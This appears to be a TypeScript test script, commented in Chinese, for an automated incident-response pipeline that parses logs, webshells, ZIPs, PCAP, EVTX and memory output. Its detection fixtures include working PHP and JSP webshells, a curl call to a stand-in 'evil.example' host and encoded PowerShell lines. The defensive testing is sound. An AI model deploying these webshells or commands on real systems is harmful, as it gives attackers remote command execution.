/**
 * V2-P0-4 IR 自动分析流水线验收。
 *
 * 覆盖：
 *  A. 文本/日志：时间线、IP/URL/账号/命令、可疑行
 *  B. Webshell 启发式
 *  C. 文件系统目录
 *  D. ZIP 递归分析
 *  E. PCAP/EVTX/内存：mock 外部工具输出；缺失工具给可读 warning
 *  F. 问题清单解析 + 候选映射（E1，不确认）
 *  G. 编排器：分析器失败隔离、输出截断；runCommandSafe 超时/输出上限/不存在工具
 *  H. Hub 端到端：导入问题 → 分析附件 → IR 视图候选 → 导出；候选明文不进 answer_candidate 事实/审计
 *
 * 用法：npm run verify:ir
 */

import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { deflateRawSync } from "node:zlib";
import { Blackboard } from "../main/blackboard/board.ts";
import { EventBus, HubService } from "../main/hub/hub.ts";
import type { SessionManager } from "../main/session/manager.ts";
import { zipCrc32 } from "../main/artifacts/zip.ts";
import {
  DEFAULT_IR_LIMITS,
  collectIrInputs,
  createDefaultIrRegistry,
  evtxAnalyzer,
  filesystemAnalyzer,
  mapQuestionCandidates,
  memoryAnalyzer,
  parseEvtxCsv,
  parseIrQuestions,
  parseTsharkCsv,
  parseVolNetscan,
  parseVolPslist,
  pcapAnalyzer,
  resolveTool,
  runCommandSafe,
  runIrAnalysis,
  textLogAnalyzer,
  webshellAnalyzer,
  zipAnalyzer,
  type IrAnalysisResult,
  type IrContext,
  type IrInput,
  type IrRegistry,
  type IrToolLog,
} from "../main/ir/index.ts";

const ROOT = process.cwd();
const RUN = path.join(ROOT, ".ui-run", "ir");
rmSync(RUN, { recursive: true, force: true });
mkdirSync(RUN, { recursive: true });
console.log("\n================ V2-P0-4 IR FIXTURE/MOCK 验收（真实工具/真实样本见 verify:ir-real） ================\n");

const results: Array<{ name: string; pass: boolean; detail: string }> = [];
function check(name: string, pass: boolean, detail = ""): void {
  results.push({ name, pass, detail });
  console.log(`${pass ? "PASS" : "FAIL"}  ${name}${detail ? `  — ${detail}` : ""}`);
}
function eq(name: string, actual: unknown, expected: unknown): void {
  check(name, actual === expected, `actual=${JSON.stringify(actual)} expected=${JSON.stringify(expected)}`);
}
function section(title: string): void {
  console.log(`\n================ ${title} ================\n`);
}

const NOW = 1_760_000_000_000;
function ctxWith(over: Partial<IrContext> = {}): IrContext {
  const audits: Array<{ action: string; detail: Record<string, unknown> }> = [];
  const ctx: IrContext = {
    taskId: "task-ir",
    workDir: RUN,
    now: NOW,
    limits: DEFAULT_IR_LIMITS,
    runCommand: async (command, argv) => ({
      command,
      argv,
      ok: false,
      exitCode: null,
      timedOut: false,
      truncated: false,
      durationMs: 0,
      stdout: "",
      stderr: "mock: 未配置",
      stdoutBytes: 0,
      stderrBytes: 0,
    }),
    resolveTool: () => null,
    audit: (action, detail) => audits.push({ action, detail }),
    log: () => undefined,
    ...over,
  };
  (ctx as unknown as { audits: typeof audits }).audits = audits;
  return ctx;
}

function inputFor(rel: string, kind: "file" | "dir" = "file"): IrInput {
  return {
    taskId: "task-ir",
    workDir: RUN,
    absolutePath: path.join(RUN, rel),
    relativePath: rel,
    kind,
    ...(kind === "file" ? { size: readFileSync(path.join(RUN, rel)).length } : {}),
  };
}

function write(rel: string, content: string | Buffer): void {
  const abs = path.join(RUN, rel);
  mkdirSync(path.dirname(abs), { recursive: true });
  writeFileSync(abs, content);
}

interface ZipItem { name: string; data: Buffer; method?: 0 | 8 }
function buildZip(items: ZipItem[]): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;
  for (const item of items) {
    const nameBuf = Buffer.from(item.name, "utf8");
    const method = item.method ?? 0;
    const comp = method === 8 ? deflateRawSync(item.data) : item.data;
    const crc = zipCrc32(item.data);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(method === 8 ? 20 : 10, 4);
    local.writeUInt16LE(method, 8);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(comp.length, 18);
    local.writeUInt32LE(item.data.length, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    const lo = offset;
    const record = Buffer.concat([local, nameBuf, comp]);
    locals.push(record);
    offset += record.length;
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE((3 << 8) | 20, 4);
    central.writeUInt16LE(method === 8 ? 20 : 10, 6);
    central.writeUInt16LE(method, 10);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(comp.length, 20);
    central.writeUInt32LE(item.data.length, 24);
    central.writeUInt16LE(nameBuf.length, 28);
    central.writeUInt32LE((0o100644 << 16) >>> 0, 38);
    central.writeUInt32LE(lo, 42);
    centrals.push(Buffer.concat([central, nameBuf]));
  }
  const cd = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(items.length, 8);
  eocd.writeUInt16LE(items.length, 10);
  eocd.writeUInt32LE(cd.length, 12);
  eocd.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cd, eocd]);
}

// ---------------------------------------------------------------- A. 文本/日志

section("A. 文本/日志分析");
const LOG_TEXT = [
  "2026-10-25T10:00:00Z 10.1.2.3 GET http://evil.example/a?x=1 user: admin",
  "2026-10-25T10:01:00Z 10.1.2.4 ssh root@host; curl http://evil.example/b",
  "2026-10-25T10:02:00Z powershell -enc SQBFAFgA suspicious",
  "no timestamp but ip 8.8.8.8 and http://example.org/x",
  "2026-10-25T10:03:00Z 10.1.2.3 again user: admin",
].join("\n");
write("attachments/access.log", LOG_TEXT);
{
  const ctx = ctxWith();
  const input = inputFor("attachments/access.log");
  check("A1 text-log detect", await textLogAnalyzer.detect(input, ctx));
  const res = await textLogAnalyzer.analyze(input, ctx);
  check("A1 时间线 >= 3", res.timeline.length >= 3, `timeline=${res.timeline.length}`);
  const ips = res.iocs.filter((i) => i.type === "ip").map((i) => i.value);
  check("A1 IP IOC", ips.includes("10.1.2.3") && ips.includes("10.1.2.4"), ips.join(","));
  check("A1 URL IOC", res.iocs.some((i) => i.type === "url" && i.value.includes("evil.example")), JSON.stringify(res.iocs.filter((i) => i.type === "url")));
  check("A1 账号 IOC", res.iocs.some((i) => i.type === "account" && i.value === "admin"), JSON.stringify(res.iocs.filter((i) => i.type === "account")));
  check("A1 命令 IOC", res.iocs.some((i) => i.type === "command" && i.value.includes("curl")), JSON.stringify(res.iocs.filter((i) => i.type === "command")));
  check("A1 可疑行事实", res.facts.some((f) => f.schema === "ir.suspicious_line"), JSON.stringify(res.facts.map((f) => f.schema)));
  check("A1 带 witness 行号", res.timeline.some((t) => (t.witness ?? "").includes(":1")), JSON.stringify(res.timeline[0]));
  check("A1 时间排序", res.timeline.every((t, i, a) => i === 0 || a[i - 1]!.at <= t.at), "timeline sorted");
  check("A1 审计回调", (ctx as unknown as { audits: unknown[] }).audits !== undefined);
}

// ---------------------------------------------------------------- B. Webshell

section("B. Webshell 启发式");
write("attachments/shell.php", "<?php eval(base64_decode($_POST['x'])); system($_GET['c']); ?>");
{
  const ctx = ctxWith();
  const input = inputFor("attachments/shell.php");
  check("B1 webshell detect", await webshellAnalyzer.detect(input, ctx));
  const res = await webshellAnalyzer.analyze(input, ctx);
  const fact = res.facts.find((f) => f.schema === "ir.webshell");
  check("B1 识别 webshell 事实", Boolean(fact), JSON.stringify(res.facts));
  check("B1 score >= 2", typeof fact?.data.score === "number" && (fact.data.score as number) >= 2, JSON.stringify(fact?.data));
  check("B1 路径 IOC", res.iocs.some((i) => i.type === "path" && i.value === "attachments/shell.php"), JSON.stringify(res.iocs));
  check("B1 带人工确认提示", res.warnings.some((w) => w.includes("需人工确认")), res.warnings.join(";"));
}
write("attachments/plain.txt", "hello world\nnothing suspicious\n");
{
  const ctx = ctxWith();
  const res = await webshellAnalyzer.analyze(inputFor("attachments/plain.txt"), ctx);
  eq("B2 普通文本不误报", res.facts.filter((f) => f.schema === "ir.webshell").length, 0);
}

// ---------------------------------------------------------------- C. 文件系统

section("C. 文件系统目录");
mkdirSync(path.join(RUN, "evidence", "web"), { recursive: true });
write("evidence/web/index.php", "<?php echo 1; ?>");
write("evidence/web/upload.php", "<?php eval($_POST['x']); ?>");
write("evidence/startup/evil.ps1", "powershell -enc AAA");
write("evidence/recent.txt", "recent");
{
  const ctx = ctxWith();
  const input = inputFor("evidence", "dir");
  check("C1 filesystem detect", await filesystemAnalyzer.detect(input, ctx));
  const res = await filesystemAnalyzer.analyze(input, ctx);
  check("C1 汇总事实", res.facts.some((f) => f.schema === "ir.file.summary"), JSON.stringify(res.facts.map((f) => f.schema)));
  check("C1 可疑路径", res.iocs.some((i) => i.type === "path" && (i.value.includes("upload.php") || i.value.includes("evil.ps1"))), JSON.stringify(res.iocs.map((i) => i.value)));
  check("C1 时间线非空", res.timeline.length > 0, `timeline=${res.timeline.length}`);
}

// ---------------------------------------------------------------- D. ZIP

section("D. ZIP 递归分析");
write("attachments/logs.zip", buildZip([
  { name: "inner.log", data: Buffer.from("2026-10-25T11:00:00Z 10.9.9.9 http://zip.example/x user: bob\n") },
  { name: "shell.jsp", data: Buffer.from("<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>") },
]));
{
  const ctx = ctxWith();
  const input = inputFor("attachments/logs.zip");
  check("D1 zip detect", await zipAnalyzer.detect(input, ctx));
  const res = await zipAnalyzer.analyze(input, ctx);
  check("D1 zip summary", res.facts.some((f) => f.schema === "ir.zip.summary"), JSON.stringify(res.facts.map((f) => f.schema)));
  check("D1 内层日志时间线", res.timeline.some((t) => (t.witness ?? "").includes("logs.zip!/inner.log")), JSON.stringify(res.timeline.map((t) => t.witness)));
  check("D1 内层 IP", res.iocs.some((i) => i.value === "10.9.9.9"), JSON.stringify(res.iocs.map((i) => i.value)));
  check("D1 内层 webshell", res.facts.some((f) => f.schema === "ir.webshell" && String(f.data.path).includes("shell.jsp")), JSON.stringify(res.facts.filter((f) => f.schema === "ir.webshell")));
  check("D1 zip slip/炸弹未触发", res.warnings.every((w) => !w.includes("path:")), res.warnings.join(";"));
}

// ---------------------------------------------------------------- E. PCAP / EVTX / 内存（mock）

section("E. PCAP / EVTX / 内存（mock 外部工具）");
{
  write("attachments/capture.pcap", "fake pcap");
  const pcapStdout = [
    "1760000000.1,10.1.2.3,10.1.2.4,80,,,GET,evil.example,/a",
    "1760000000.2,10.1.2.4,8.8.8.8,,53,example.com,,,",
  ].join("\n");
  const ctx = ctxWith({
    resolveTool: () => "tshark",
    runCommand: async (command, argv) => ({
      command,
      argv,
      ok: true,
      exitCode: 0,
      timedOut: false,
      truncated: false,
      durationMs: 5,
      stdout: pcapStdout,
      stderr: "",
      stdoutBytes: pcapStdout.length,
      stderrBytes: 0,
    }),
  });
  const input = inputFor("attachments/capture.pcap");
  check("E1 pcap detect", await pcapAnalyzer.detect(input, ctx));
  const res = await pcapAnalyzer.analyze(input, ctx);
  check("E1 pcap 时间线", res.timeline.length >= 2, `timeline=${res.timeline.length}`);
  check("E1 pcap IOC", res.iocs.some((i) => i.value === "10.1.2.3") && res.iocs.some((i) => i.value === "evil.example"), JSON.stringify(res.iocs.map((i) => i.value)));
  check("E1 pcap 工具日志", res.toolLogs.some((t) => t.tool === "tshark" && t.ok), JSON.stringify(res.toolLogs));
  eq("E1 parseTsharkCsv", parseTsharkCsv(pcapStdout).length, 2);

  const missing = await pcapAnalyzer.analyze(input, ctxWith());
  check("E2 tshark 缺失 warning", missing.warnings.some((w) => w.includes("未安装 tshark")), missing.warnings.join(";"));
  eq("E2 tshark 缺失不伪造事实", missing.facts.length, 0);
}
{
  const evtxCsv = [
    "RecordNumber,TimeCreated,EventId,Channel,Computer,UserName,Payload",
    '1,2026-10-25T10:00:00Z,4625,Security,PC1,admin,"failed logon from 10.1.2.3"',
    '2,2026-10-25T10:01:00Z,1102,Security,PC1,admin,"log cleared"',
    '3,2026-10-25T10:02:00Z,4688,Security,PC1,bob,"NewProcessName: C:\\Windows\\Temp\\evil.exe"',
  ].join("\n");
  const rows = parseEvtxCsv(evtxCsv);
  eq("E3 EVTX 行数", rows.length, 3);
  eq("E3 EVTX 日志清除", rows[1]?.eventId, 1102);
  write("attachments/security.evtx", "fake evtx");
  const ctx = ctxWith({
    resolveTool: () => "EvtxECmd",
    runCommand: async (command, argv) => {
      const csvDir = argv[argv.indexOf("--csv") + 1]!;
      const csvName = argv[argv.indexOf("--csvf") + 1]!;
      writeFileSync(path.join(csvDir, csvName), evtxCsv);
      return {
        command,
        argv,
        ok: true,
        exitCode: 0,
        timedOut: false,
        truncated: false,
        durationMs: 7,
        stdout: "done",
        stderr: "",
        stdoutBytes: 4,
        stderrBytes: 0,
      };
    },
  });
  const input = inputFor("attachments/security.evtx");
  const { evtxAnalyzer } = await import("../main/ir/analyzers/evtx.ts");
  check("E3 evtx detect", await evtxAnalyzer.detect(input, ctx));
  const res = await evtxAnalyzer.analyze(input, ctx);
  check("E3 EVTX 时间线", res.timeline.length === 3, `timeline=${res.timeline.length}`);
  check("E3 EVTX 日志清除影响", res.timeline.some((t) => t.impact === "日志被清除"), JSON.stringify(res.timeline.map((t) => t.impact)));
  check("E3 EVTX 账号/IP/进程 IOC", res.iocs.some((i) => i.type === "account") && res.iocs.some((i) => i.type === "ip") && res.iocs.some((i) => i.type === "process"), JSON.stringify(res.iocs.map((i) => [i.type, i.value])));
  const missing = await evtxAnalyzer.analyze(input, ctxWith());
  check("E4 EvtxECmd 缺失 warning", missing.warnings.some((w) => w.includes("未安装 EvtxECmd")), missing.warnings.join(";"));
}
{
  const pslist = ["PID   PPID  ImageFileName   CreateTime", "4     0     System          2026-10-25 10:00:00", "1234  4     evil.exe        2026-10-25 10:01:00"].join("\n");
  const netscan = ["Proto  LocalAddr       ForeignAddr     State  PID   Owner", "TCP    10.1.2.4:445    10.1.2.3:5555   ESTAB  1234  evil.exe"].join("\n");
  eq("E5 parseVolPslist", parseVolPslist(pslist).length, 2);
  eq("E5 parseVolNetscan", parseVolNetscan(netscan).length, 1);
  write("attachments/memory.raw", "fake memory");
  const ctx = ctxWith({
    resolveTool: () => "vol",
    runCommand: async (command, argv) => {
      const stdout = argv.includes("windows.pslist") ? pslist : netscan;
      return {
        command,
        argv,
        ok: true,
        exitCode: 0,
        timedOut: false,
        truncated: false,
        durationMs: 9,
        stdout,
        stderr: "",
        stdoutBytes: stdout.length,
        stderrBytes: 0,
      };
    },
  });
  const input = inputFor("attachments/memory.raw");
  check("E5 memory detect", await memoryAnalyzer.detect(input, ctx));
  const res = await memoryAnalyzer.analyze(input, ctx);
  check("E5 内存进程", res.iocs.some((i) => i.type === "process" && i.value === "evil.exe"), JSON.stringify(res.iocs.map((i) => [i.type, i.value])));
  check("E5 内存外联 IP", res.iocs.some((i) => i.type === "ip" && i.value === "10.1.2.3"), JSON.stringify(res.iocs.map((i) => [i.type, i.value])));
  check("E5 内存汇总", res.facts.some((f) => f.schema === "ir.memory.summary"), JSON.stringify(res.facts.map((f) => f.schema)));
  const missing = await memoryAnalyzer.analyze(input, ctxWith());
  check("E6 Volatility 缺失 warning", missing.warnings.some((w) => w.includes("未安装 Volatility 3")), missing.warnings.join(";"));
}

// ---------------------------------------------------------------- F. 问题清单

section("F. 问题清单解析 + 候选映射");
{
  const qs = parseIrQuestions("1. 攻击者 IP 是什么？\n2、Webshell 路径？\n# 注释\n\n3. 入侵时间？");
  eq("F1 行解析数量", qs.length, 3);
  eq("F1 id", qs[0]?.id, "q1");
  const json = parseIrQuestions(JSON.stringify([{ id: "a", question: "账号？" }, { question: "命令？" }]));
  eq("F1 JSON 解析", json.length, 2);
  eq("F1 JSON id 兜底", json[1]?.id, "q2");

  const logRes = await textLogAnalyzer.analyze(inputFor("attachments/access.log"), ctxWith());
  const shellRes = await webshellAnalyzer.analyze(inputFor("attachments/shell.php"), ctxWith());
  const ipCands = mapQuestionCandidates({ id: "q1", question: "攻击者 IP 是什么？" }, [logRes]);
  check("F2 IP 候选", ipCands.length > 0 && ipCands[0]?.answerType === "ip" && ipCands[0]?.value === "10.1.2.3", JSON.stringify(ipCands));
  eq("F2 候选证据 E1", ipCands[0]?.evidence, "E1");
  check("F2 候选带 gap", (ipCands[0]?.gaps ?? []).length > 0, JSON.stringify(ipCands[0]?.gaps));

  const timeCands = mapQuestionCandidates({ id: "q2", question: "入侵时间是什么？" }, [logRes]);
  check("F3 时间候选", timeCands[0]?.answerType === "timestamp" && timeCands[0]?.value.includes("2026-10-25"), JSON.stringify(timeCands));

  const pathCands = mapQuestionCandidates({ id: "q3", question: "Webshell 路径？" }, [shellRes]);
  check("F4 路径候选", pathCands.some((c) => c.value === "attachments/shell.php"), JSON.stringify(pathCands));

  const gaps = mapQuestionCandidates({ id: "q4", question: "攻击者 IP 是什么？" }, []);
  check("F5 无证据给 gap", gaps.length === 1 && gaps[0]?.value === "" && (gaps[0]?.gaps ?? []).length > 0, JSON.stringify(gaps));
}

// ---------------------------------------------------------------- G. 编排器

section("G. 编排器：失败隔离/截断；runCommandSafe");
{
  const ctx = ctxWith({ limits: { ...DEFAULT_IR_LIMITS, maxFacts: 1, maxTimeline: 1, maxIocs: 1 } });
  const okAnalyzer = {
    id: "mock-ok",
    title: "mock ok",
    detect: () => true,
    async analyze(input: IrInput): Promise<IrAnalysisResult> {
      return {
        analyzerId: "mock-ok",
        analyzerTitle: "mock ok",
        input,
        facts: [
          { schema: "x", data: { n: 1 }, evidence: "E1" },
          { schema: "x", data: { n: 2 }, evidence: "E1" },
        ],
        timeline: [
          { at: 1, source: "mock", event: "a", evidence: "E1" },
          { at: 2, source: "mock", event: "b", evidence: "E1" },
        ],
        iocs: [
          { type: "ip", value: "1.1.1.1", count: 1, evidence: "E1" },
          { type: "ip", value: "2.2.2.2", count: 1, evidence: "E1" },
        ],
        answerCandidates: [],
        warnings: [],
        toolLogs: [],
      };
    },
  };
  const badAnalyzer = {
    id: "mock-bad",
    title: "mock bad",
    detect: () => true,
    async analyze(): Promise<IrAnalysisResult> {
      throw new Error("boom");
    },
  };
  const registry = {
    detect: async () => [okAnalyzer, badAnalyzer],
  } as unknown as IrRegistry;
  const bundle = await runIrAnalysis({ inputs: [inputFor("attachments/access.log")], registry, ctx });
  check("G1 失败分析器被隔离", bundle.warnings.some((w) => w.includes("mock-bad") && w.includes("boom")), JSON.stringify(bundle.warnings));
  check("G1 成功分析器保留", bundle.results.some((r) => r.analyzerId === "mock-ok"), JSON.stringify(bundle.results.map((r) => r.analyzerId)));
  const ok = bundle.results.find((r) => r.analyzerId === "mock-ok")!;
  eq("G1 facts 截断", ok.facts.length, 1);
  eq("G1 timeline 截断", ok.timeline.length, 1);
  eq("G1 iocs 截断", ok.iocs.length, 1);
  check("G1 截断 warning", ok.warnings.some((w) => w.includes("上限")), ok.warnings.join(";"));

  const started = Date.now();
  const timeout = await runCommandSafe(process.execPath, ["-e", "setTimeout(()=>{}, 5000)"], {
    cwd: RUN,
    timeoutMs: 120,
    maxOutputBytes: 1024,
  });
  check("G2 超时被终止", timeout.timedOut === true && timeout.ok === false, JSON.stringify(timeout));
  check("G2 超时耗时有界", Date.now() - started < 5000, `${Date.now() - started}ms`);

  const huge = await runCommandSafe(process.execPath, ["-e", "process.stdout.write('A'.repeat(100000))"], {
    cwd: RUN,
    timeoutMs: 5000,
    maxOutputBytes: 1024,
  });
  check("G3 输出截断", huge.truncated === true && huge.stdoutBytes <= 1024, JSON.stringify({ truncated: huge.truncated, bytes: huge.stdoutBytes }));

  const missing = await runCommandSafe("definitely-not-a-tool-xyz", [], { cwd: RUN, timeoutMs: 500 });
  check("G4 不存在工具可读失败", missing.ok === false && missing.exitCode === null && missing.stderr.length > 0, JSON.stringify(missing));
}

// ---------------------------------------------------------------- H. Hub 端到端

section("H. Hub 端到端：问题导入 → 分析 → IR 视图 → 导出");
{
  const dir = path.join(RUN, "hub");
  mkdirSync(dir, { recursive: true });
  const board = Blackboard.open(path.join(dir, "board.db"));
  const stubSessions = { listSessions: () => [], historyOf: () => [] } as unknown as SessionManager;
  const hub = new HubService({
    board,
    sessions: stubSessions,
    bus: new EventBus(),
    workspaceRoot: dir,
    workDir: dir,
    specFor: () => null,
    convergeGraceMs: 0,
  });
  const created = await hub.dispatch({
    type: "task.create",
    title: "IR 端到端",
    brief: "日志+webshell",
    category: "ir",
  });
  check("H1 创建 IR 任务", created.ok, JSON.stringify(created));
  const taskId = hub.currentTaskId!;
  mkdirSync(path.join(dir, taskId, "attachments"), { recursive: true });
  writeFileSync(
    path.join(dir, taskId, "attachments", "access.log"),
    "2026-10-25T10:00:00Z 10.1.2.3 http://evil.example/a user: admin\n2026-10-25T10:01:00Z 10.1.2.4 curl http://evil.example/b\n",
  );
  writeFileSync(
    path.join(dir, taskId, "attachments", "shell.php"),
    "<?php eval(base64_decode($_POST['x'])); system($_GET['c']); ?>",
  );
  const questionImport = await hub.dispatch({
    type: "ir.questions.import",
    taskId,
    text: "攻击者 IP 是什么？\nWebshell 路径？\n入侵时间？",
  });
  check("H1 导入问题", questionImport.ok && (questionImport.message ?? "").includes("3"), JSON.stringify(questionImport));

  const analyzed = await hub.dispatch({ type: "ir.analyze", taskId });
  check("H2 分析成功", analyzed.ok, JSON.stringify(analyzed).slice(0, 500));
  const summary = analyzed.irAnalysis;
  check("H2 摘要含输入/事实/候选", Boolean(summary && summary.inputs >= 2 && summary.facts > 0 && summary.candidates > 0), JSON.stringify(summary));

  const snap = hub.snapshot();
  const ir = snap.ir!;
  check("H3 IR 视图有问题", ir.questions.length === 3, `questions=${ir.questions.length}`);
  const ipQ = ir.questions.find((q) => q.question.includes("IP"));
  check("H3 IP 问题有候选", Boolean(ipQ?.candidates?.some((c) => c.value === "10.1.2.3")), JSON.stringify(ipQ));
  check("H3 候选带来源/缺口", Boolean(ipQ?.candidates?.some((c) => (c.sources?.length ?? 0) > 0 && (c.gaps?.length ?? 0) > 0)), JSON.stringify(ipQ?.candidates));
  check("H3 分析运行摘要", (ir.analysis?.length ?? 0) > 0, JSON.stringify(ir.analysis));
  check("H3 时间线/IOC 事实进入视图", ir.timeline.length > 0 && ir.analysis!.some((a) => a.iocs > 0), `timeline=${ir.timeline.length}`);

  const flags = board.listFlagCandidates(taskId);
  check("H4 候选值进 flag_candidates", flags.some((f) => f.value === "10.1.2.3" && f.answer_type === "ip"), JSON.stringify(flags.map((f) => [f.value, f.answer_type])));
  check("H4 候选未确认", flags.every((f) => f.status === "new"), JSON.stringify(flags.map((f) => f.status)));

  const answerFacts = board.raw(
    "SELECT content FROM facts WHERE content LIKE '%ir.answer_candidate%'",
  ) as Array<{ content: string }>;
  check("H5 answer_candidate 事实不含候选值", answerFacts.every((f) => !f.content.includes("10.1.2.3")), JSON.stringify(answerFacts));
  const lifecycle = board.raw(
    "SELECT body FROM events WHERE kind = 'lifecycle' AND body LIKE '%flag.candidate%'",
  ) as Array<{ body: string }>;
  check("H5 候选事件不含明文", lifecycle.every((e) => !e.body.includes("10.1.2.3")), JSON.stringify(lifecycle));
  const audits = board.raw("SELECT detail FROM audit WHERE action = 'ir.analyze'") as Array<{ detail: string }>;
  check("H5 分析审计不含明文", audits.every((a) => !a.detail.includes("10.1.2.3")), JSON.stringify(audits));

  const exp = await hub.dispatch({ type: "ir.export", taskId, format: "md" });
  check("H6 导出成功", exp.ok && (exp.content ?? "").includes("IR 导出"), JSON.stringify({ ok: exp.ok }));
  check("H6 导出含候选与缺口", (exp.content ?? "").includes("10.1.2.3") && (exp.content ?? "").includes("缺口"), (exp.content ?? "").slice(0, 300));
  check("H6 导出含分析运行", (exp.content ?? "").includes("分析运行"), "analysis section");

  board.close();
}

// ---------------------------------------------------------------- G2 覆盖率 sentinel（FIXTURE/MOCK）
console.log("\n================ G2 覆盖率 sentinel（FIXTURE/MOCK：证明不只扫描前 5000 行） ================\n");
{
  // EVTX：6500 行 CSV，第 6000 行 1102 + 独特 IP；mock EvtxECmd 只负责写 CSV。
  const dir = path.join(RUN, "sentinel");
  mkdirSync(dir, { recursive: true });
  const evtxFile = path.join(dir, "sentinel.evtx");
  writeFileSync(evtxFile, "dummy evtx");
  const evtxLines = ["RecordNumber,TimeCreated,EventId,Channel,Computer,UserName,MapDescription,Payload"];
  for (let i = 1; i <= 6500; i++) {
    const ts = `2026-10-25T10:${String(Math.floor(i / 60) % 60).padStart(2, "0")}:${String(i % 60).padStart(2, "0")}Z`;
    if (i === 6000) {
      evtxLines.push(`${i},${ts},1102,Security,PC-SENTINEL,user,Log cleared,"sentinel 203.0.113.77 log cleared"`);
    } else {
      evtxLines.push(`${i},${ts},7045,System,PC-FILLER,user,Service installed,"filler service"`);
    }
  }
  const evtxCsv = evtxLines.join("\n");
  const evtxCtx = ctxWith({
    resolveTool: (envVar) => (envVar === "BUMIMANG_EVTXECMD" ? "EvtxECmd" : null),
    runCommand: async (command, argv) => {
      const outDir = argv[argv.indexOf("--csv") + 1]!;
      const outName = argv[argv.indexOf("--csvf") + 1]!;
      mkdirSync(outDir, { recursive: true });
      writeFileSync(path.join(outDir, outName), evtxCsv, "utf8");
      return {
        command,
        argv,
        ok: true,
        exitCode: 0,
        timedOut: false,
        truncated: false,
        durationMs: 1,
        stdout: "Maps loaded: 453\n",
        stderr: "",
        stdoutBytes: 18,
        stderrBytes: 0,
      };
    },
  });
  const evtxInput: IrInput = {
    taskId: "sentinel-evtx",
    workDir: dir,
    absolutePath: evtxFile,
    relativePath: "sentinel/sentinel.evtx",
    kind: "file",
    size: 10,
  };
  const evtxRes = await evtxAnalyzer.analyze(evtxInput, evtxCtx);
  const evtxSummary = evtxRes.facts.find((f) => f.schema === "ir.evtx.summary");
  eq("G2 EVTX sentinel 全量扫描 6500 行", evtxSummary?.data.totalScanned, 6500);
  eq("G2 EVTX sentinel 命中第 6000 行 EventID 1102", (evtxSummary?.data.keyEventCounts as Record<string, number> | undefined)?.["1102"], 1);
  check(
    "G2 EVTX sentinel 时间线包含 1102（不被展示上限吞掉）",
    evtxRes.timeline.some((t) => t.event.includes("EventID 1102")),
    JSON.stringify(evtxRes.timeline.slice(0, 3).map((t) => t.event)),
  );
  eq("G2 EVTX sentinel totalMatched=6500", evtxSummary?.data.totalMatched, 6500);
  eq("G2 EVTX sentinel truncatedForDisplay=true", evtxSummary?.data.truncatedForDisplay, true);
  eq("G2 EVTX parseEvtxCsv 默认不截断", parseEvtxCsv(evtxCsv).length, 6500);

  // PCAP：6000 行 tshark CSV，第 6000 行 sentinel IP/域名；mock tshark 只负责返回 CSV。
  const pcapCSV: string[] = [];
  for (let i = 1; i <= 6000; i++) {
    const epoch = 1760000000 + i / 1000;
    if (i === 6000) {
      pcapCSV.push(`${epoch},203.0.113.66,10.9.8.7,80,,sentinel.example,GET,sentinel.example,/sentinel?x=9`);
    } else {
      pcapCSV.push(`${epoch},10.1.2.3,10.9.8.7,80,,filler.example,,,`);
    }
  }
  const pcapText = pcapCSV.join("\n");
  const pcapFile = path.join(dir, "sentinel.pcap");
  writeFileSync(pcapFile, "dummy pcap");
  const pcapCtx = ctxWith({
    resolveTool: (envVar) => (envVar === "BUMIMANG_TSHARK" ? "tshark" : null),
    runCommand: async (command, argv) => ({
      command,
      argv,
      ok: true,
      exitCode: 0,
      timedOut: false,
      truncated: false,
      durationMs: 1,
      stdout: pcapText,
      stderr: "",
      stdoutBytes: pcapText.length,
      stderrBytes: 0,
    }),
  });
  const pcapInput: IrInput = {
    taskId: "sentinel-pcap",
    workDir: dir,
    absolutePath: pcapFile,
    relativePath: "sentinel/sentinel.pcap",
    kind: "file",
    size: 10,
  };
  const pcapRes = await pcapAnalyzer.analyze(pcapInput, pcapCtx);
  const pcapSummary = pcapRes.facts.find((f) => f.schema === "ir.pcap.summary");
  eq("G2 PCAP sentinel 全量扫描 6000 行", pcapSummary?.data.totalScanned, 6000);
  check("G2 PCAP sentinel 命中第 6000 行 IP", pcapRes.iocs.some((i) => i.type === "ip" && i.value === "203.0.113.66"), JSON.stringify(pcapRes.iocs.slice(0, 5)));
  check("G2 PCAP sentinel 命中第 6000 行域名", pcapRes.iocs.some((i) => i.type === "domain" && i.value === "sentinel.example"), JSON.stringify(pcapRes.iocs.slice(0, 5)));
  eq("G2 PCAP sentinel coverage=full", pcapSummary?.data.coverage, "full");
  eq("G2 PCAP sentinel truncatedForDisplay=true", pcapSummary?.data.truncatedForDisplay, true);
  eq("G2 PCAP parseTsharkCsv 默认不截断", parseTsharkCsv(pcapText).length, 6000);
}

const failed = results.filter((r) => !r.pass).length;
console.log(`\n================ ${results.length - failed}/${results.length} FIXTURE_PASS（FIXTURE/MOCK，不计入真实 IR） ================`);
if (failed > 0) process.exitCode = 1;
